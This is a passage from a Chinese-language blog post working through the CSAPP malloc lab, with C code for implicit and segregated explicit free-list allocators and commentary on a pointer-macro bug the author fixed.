class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    </span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;	<span class="comment">// 保证对齐</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)	<span class="comment">// 分配空间</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    	</span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));			<span class="comment">// 初始化头部</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));			<span class="comment">// 初始化脚部</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));	<span class="comment">// 初始化结尾块</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);	<span class="comment">// 合并相邻空闲块</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));	<span class="comment">// 设置头部和脚部</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    coalesce(bp);	<span class="comment">// 看看前后有没有空闲块可以合并</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));	<span class="comment">// 得到前一个块的有效位</span></span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));	<span class="comment">// 得到下一个块的有效位</span></span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));	<span class="comment">// 得到这个块的大小</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;	<span class="comment">// 前一个块有效，下一个块也有效</span></span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;	<span class="comment">// 前一个块有效，下一个块空闲</span></span><br><span class="line">    	size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    	PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;	<span class="comment">// 前一个块空闲，下一个块有效</span></span><br><span class="line">    	size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">    	PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;	<span class="comment">// 前一个块空闲，下一个块也空闲</span></span><br><span class="line">    	size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">    	PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	bp = PREV_BLKP(bp);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendsize;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    	</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE) &#123;	</span><br><span class="line">    	asize = <span class="number">2</span> * DSIZE;	<span class="comment">// 强制最小块大小为 16 字节</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	asize = DSIZE * ((size + DSIZE + (DSIZE - <span class="number">1</span>)) / DSIZE);	<span class="comment">// 向上取整到最接近 8 的倍数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;	<span class="comment">// 在空闲链表中找没有名合适的空闲块</span></span><br><span class="line">    	place(bp, asize);	<span class="comment">// 有就放置并分割（可选）</span></span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>)	<span class="comment">// 没有合适的空闲块，向系统请求新的空闲块</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp, asize);	</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *bp;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp)) &#123;	<span class="comment">// 遍历隐式空闲链表</span></span><br><span class="line">    	<span class="keyword">if</span> ((!GET_ALLOC(HDRP(bp))) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123;	<span class="comment">// 如果一个块是空闲的且大小合适</span></span><br><span class="line">    	    <span class="keyword">return</span> bp;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> asize)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= (<span class="number">2</span> * DSIZE)) &#123;	<span class="comment">// 如果块的剩余部分大于一个最小块的大小，那么就分割</span></span><br><span class="line">    	PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));	<span class="comment">// 初始化已分配块</span></span><br><span class="line">    	PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">    	bp = NEXT_BLKP(bp);</span><br><span class="line">    	PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));	<span class="comment">// 初始化分割后的空闲块</span></span><br><span class="line">    	PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    	PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="type">void</span> *newptr;</span><br><span class="line">    <span class="type">size_t</span> copySize;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((newptr = mm_malloc(size)) == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = GET_SIZE(HDRP(oldptr));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)	<span class="comment">// 保证 copySize 始终是最小的</span></span><br><span class="line">      copySize = size;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);	<span class="comment">// 将 oldptr 指向的旧块中 copySize 个字节的值拷贝到 newptr 指向的新块</span></span><br><span class="line">    mm_free(oldptr);	<span class="comment">// 释放 oldptr 指向的旧块</span></span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="explicit-free-lists"><a href="#explicit-free-lists" class="headerlink" title="explicit free lists"></a>explicit free lists</h1><ul>
<li>隐式空闲链表的效率很低，这是因为块分配和堆块的总数呈线性关系，我们每次进行分配操作，都需要从头遍历空闲链表</li>
<li>一种更好的方法是将空闲链表组织成某种形式的显示数据结构，这就是我们接下来将要介绍的重点 <strong>显示空闲链表</strong></li>
<li>在这种数据结构中，堆可以组织成一个空闲双向链表，每个空闲块中都包含一个 pred（前驱）和 succ（后继）指针。具体形式如下</li>
</ul>
<img src="/2024/04/07/CSAPP-Lab7/image-20240409163431274.png" class="" title="image-20240409163431274">

<blockquote>
<p>堆块的格式</p>
</blockquote>
<ul>
<li><p>使用这种显示空闲链表，首次适配的分配时间从堆块总数的线性时间减少到了空闲块数量的线性时间</p>
</li>
<li><p>一种流行的减少分配时间的方法，通常称为 <strong>分离存储</strong>，就是维护多个空闲链表，其中每个空闲链表中的块大小大致相同，这些空闲链表也叫 <strong>大小类</strong></p>
</li>
<li><p>我们可以根据 2 的幂来划分块大小，比如：[0, 2^4^]、(2^4^, 2^5^]、(2^5^, 2^6^]、(2^6^, 2^7^]、(2^7^, 2^8^] …… (2^n^, +endless)</p>
<blockquote>
<p>从 2^4^ 开始划分是因为一个块的最小字节数为 16 byte（8 个字节保存头部和脚部，8 个字节保存 pred 和 succ）</p>
</blockquote>
</li>
<li><p>我们划分 20 个大小类，那么此时堆的结构大致如下</p>
</li>
</ul>
<img src="/2024/04/07/CSAPP-Lab7/image-20240409165557250.png" class="" title="image-20240409165557250">

<ul>
<li>为了方便操作大小类和堆块中的 pred 和 succ 指针，我们定义了几个宏，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NUM 20	<span class="comment">// 大小类的数量</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PRED(bp) ((char *)(bp))				<span class="comment">// 得到当前块的前驱指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SUCC(bp) (((char *)(bp)) + WSIZE)	<span class="comment">// 得到当前块的后继指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_HEAD(index) ((char *)GET(heap_listp + index * WSIZE))	<span class="comment">// 得到指定大小类头节点载荷部分的指针 </span></span></span><br></pre></td></tr></table></figure>

<h2 id="mm-init-1"><a href="#mm-init-1" class="headerlink" title="mm_init"></a>mm_init</h2><ul>
<li><p>在填充字后边创建了 CLASS_NUM（20）个大小类并初始化为 NULL</p>
</li>
<li><p>其他操作和隐式空闲链表的 mm_init 一样</p>
<blockquote>
<p>在隐式空闲链表中，heap_listp 始终指向序言块，而在显示空闲链表的实现中，为了方便，我们让它指向大小类的起始地址</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk((<span class="number">4</span> + CLASS_NUM) * WSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);	<span class="comment">// 初始化填充字</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CLASS_NUM; i++) 	<span class="comment">// 初始化大小类</span></span><br><span class="line">    	PUT(heap_listp + WSIZE + i * WSIZE, <span class="literal">NULL</span>); </span><br><span class="line">    </span><br><span class="line">    PUT(heap_listp + <span class="number">1</span> * WSIZE + CLASS_NUM * WSIZE, PACK(DSIZE, <span class="number">1</span>));	<span class="comment">// 初始化序言块</span></span><br><span class="line">    PUT(heap_listp + <span class="number">2</span> * WSIZE + CLASS_NUM * WSIZE, PACK(DSIZE, <span class="number">1</span>));	</span><br><span class="line">    PUT(heap_listp + <span class="number">3</span> * WSIZE + CLASS_NUM * WSIZE, PACK(<span class="number">0</span>, <span class="number">1</span>));		<span class="comment">// 初始化结尾块</span></span><br><span class="line">    heap_listp += WSIZE;	</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="literal">NULL</span>)	<span class="comment">// 创建初始的空闲块</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="extend-heap-1"><a href="#extend-heap-1" class="headerlink" title="extend_heap"></a>extend_heap</h2><ul>
<li><p>和隐式空闲链表的 extend_heap 操作一样。我原本想要在初始化头部和脚部后，再初始化这个空闲块的 pred 和 succ 指针，之后发现并无必要</p>
</li>
<li><p>因为在 coalesce 方法中，完成前后空闲块的合并后，我们会将这个空闲块 insert 到合适的大小类中；在 insert 方法中，我们会重新设置它的 pred 和 succ 指针 </p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    </span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;	<span class="comment">// 保证对齐</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)	<span class="comment">// 分配空间</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));			<span class="comment">// 初始化头部和脚部</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// PUT(GET_PRED(bp), NULL);				// 初始化前驱和后继指针，并无必要</span></span><br><span class="line">    <span class="comment">// PUT(GET_SUCC(bp), NULL);</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));	<span class="comment">// 初始化结尾块</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);	<span class="comment">// 前后看看有没有空闲块可以合并</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="coalesce-1"><a href="#coalesce-1" class="headerlink" title="coalesce"></a>coalesce</h2><ul>
<li><p>和隐式空闲链表的 coalesce 操作一样。有一点不同的是，在合并之前，我们需要将要合并的空闲块从它的大小类中 delete，合并完成后，再将合并后的空闲块 insert 到合适的大小类中</p>
<blockquote>
<p>根据堆块的相邻块的情况来合并的，与在链表中的排列顺序无关</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));	<span class="comment">// 得到前一个块的有效位</span></span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));	<span class="comment">// 得到后一个块的有效位</span></span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));	<span class="comment">// 得到当前块的大小</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;	<span class="comment">// 前一个块已分配，后一个块也已分配</span></span><br><span class="line">    	insert(bp);</span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;	<span class="comment">// 前一个块已分配，后一个块空闲</span></span><br><span class="line">    	delete(NEXT_BLKP(bp));	</span><br><span class="line">    	size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    	PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;	<span class="comment">// 前一个块空闲，后一个块已分配</span></span><br><span class="line">    	delete(PREV_BLKP(bp));</span><br><span class="line">    	size += GET_SIZE(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    	PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	bp = PREV_BLKP(bp);</span><br><span class="line">    	<span class="comment">// size += GET_SIZE(HDRP(PREV_BLKP(bp)));	// 和上述操作逻辑相同</span></span><br><span class="line">    	<span class="comment">// PUT(FTRP(bp), PACK(size, 0));</span></span><br><span class="line">    	<span class="comment">// PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));</span></span><br><span class="line">    	<span class="comment">// bp = PREV_BLKP(bp);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;	<span class="comment">// 前一个块空闲，后一个块也空闲</span></span><br><span class="line">    	delete(PREV_BLKP(bp));</span><br><span class="line">    	delete(NEXT_BLKP(bp));</span><br><span class="line">    	size += GET_SIZE(FTRP(PREV_BLKP(bp))) + GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    	PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	bp = PREV_BLKP(bp);</span><br><span class="line">    	<span class="comment">// size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp))); // 和上述操作逻辑相同</span></span><br><span class="line">    	<span class="comment">// PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0));</span></span><br><span class="line">    	<span class="comment">// PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));</span></span><br><span class="line">    	<span class="comment">// bp = PREV_BLKP(bp);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    insert(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><ul>
<li><p>将空闲块插入到合适的大小类中。我们采用 <strong>LIFO（后进先出）</strong> 的顺序维护链表，总是将新的空闲块放置在链表的开始处</p>
<blockquote>
<p>后进先出其实就是先进后出（栈结构），简单来说就是采用 <strong>头插法</strong></p>
</blockquote>
</li>
<li><p>search 方法通过空闲块的 size（块大小）找到合适大小类的下标索引</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">void</span> *bp)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> index = search(size);	<span class="comment">// 寻找合适的大小类</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (GET_HEAD(index) == <span class="literal">NULL</span>) &#123;	<span class="comment">// 这个大小类为空</span></span><br><span class="line">    	PUT(GET_PRED(bp), <span class="literal">NULL</span>);	<span class="comment">// 前驱和后继指针都设置为 NULL</span></span><br><span class="line">    	PUT(GET_SUCC(bp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;									<span class="comment">// 这个大小类不为空</span></span><br><span class="line">    	PUT(GET_PRED(bp), <span class="literal">NULL</span>);			<span class="comment">// 前驱设置为 NULL</span></span><br><span class="line">    	PUT(GET_SUCC(bp), GET_HEAD(index));	<span class="comment">// 后继设置为大小类的头节点</span></span><br><span class="line">    	PUT(GET_PRED(GET_HEAD(index)), bp);	<span class="comment">// 大小头节点的前驱设置为当前空闲块</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    PUT(heap_listp + index * WSIZE, bp);	<span class="comment">// 重新设置大小类头节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><ul>
<li><p>从大小类中删除这个空闲块。就是很简单的从链表中删除节点，有四种情况</p>
</li>
<li><p>代码中的注释部分是我之前的犯下的错误。要写出正确的代码，就需要真正搞懂我们定义的宏到底给了我们什么，做了什么</p>
</li>
<li><p>假如我们想要让当前空闲块的前一个空闲块的 succ 指针指向当前空闲块的后一个空闲块</p>
<ul>
<li><p>我之前的操作是 <code>PUT(GET_SUCC(GET_PRED(bp)), GET_SUCC(bp))</code></p>
</li>
<li><p>而它实际正在做的是</p>
<ul>
<li><p>GET_PRED(bp) 返回了 bp， GET_SUCC(bp) 返回了 bp + WSIZE（当前空闲块的 succ）</p>
</li>
<li><p>那么 PUT(bp + WSIZE, bp + WSIZE) 就会将当前空闲块的 succ 赋值为 bp + WSIZE，也就是说它让当前空闲块的 succ 指针指向了它自己！</p>
</li>
<li><p>这和我们的想要做的大相径庭，而造成错误的主要原因就是：想当然的使用这些宏，简单的认为 GET_PRED 会直接返回当前空闲块的前一个空闲块的 bp</p>
<blockquote>
<p>而如果 GET_PRED 和 GET_SUCC 真的直接返回了当前空闲块的前 &#x2F; 后一个空闲块的 bp，那也会造成错误！</p>
<p><code>PUT(GET_SUCC(GET_PRED(bp)), GET_SUCC(bp))</code> 会让当前空闲块的前一个空闲块的后一个空闲块（还是当前空闲块）指向当前空闲块的后一个空闲块</p>
<p>正确的操作就变为了 <code>PUT(GET_PRED(bp) + WSIZE, GET_SUCC(bp))</code></p>
</blockquote>
</li>
</ul>
</li>
<li><p>正确的操作是 <code>PUT(GET_SUCC(GET(GET_PRED(bp))), GET(GET_SUCC(bp)))</code>，在合适的地方使用 GET 来得到 pred &#x2F; succ 指针指向的块的 bp</p>
</li>
</ul>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">void</span> *bp)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> index = search(size);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (GET(GET_PRED(bp)) &amp;&amp; GET(GET_SUCC(bp))) &#123;	<span class="comment">// 前驱不为空，后继也不为空</span></span><br><span class="line">    	<span class="comment">// PUT(GET_SUCC(GET_PRED(bp)), GET_SUCC(bp));	// 错误示例</span></span><br><span class="line">    	PUT(GET_SUCC(GET(GET_PRED(bp))), GET(GET_SUCC(bp)));</span><br><span class="line">    	<span class="comment">// PUT(GET_PRED(GET_SUCC(bp)), GET_PRED(bp));</span></span><br><span class="line">    	PUT(GET_PRED(GET(GET_SUCC(bp))), GET(GET_PRED(bp)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (GET(GET_PRED(bp)) &amp;&amp; !GET(GET_SUCC(bp))) &#123;	<span class="comment">// 前驱不为空，后继为空</span></span><br><span class="line">    	<span class="comment">// PUT(GET_SUCC(GET_PRED(bp)), NULL);</span></span><br><span class="line">    	PUT(GET_SUCC(GET(GET_PRED(bp))), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!GET(GET_PRED(bp)) &amp;&amp; GET(GET_SUCC(bp))) &#123;	<span class="comment">// 前驱为空，后继不为空</span></span><br><span class="line">	<span class="comment">// PUT(GET_PRED(GET_SUCC(bp)), NULL);</span></span><br><span class="line">	PUT(GET_PRED(GET(GET_SUCC(bp))), <span class="literal">NULL</span>);</span><br><span class="line">	PUT(heap_listp + index * WSIZE, 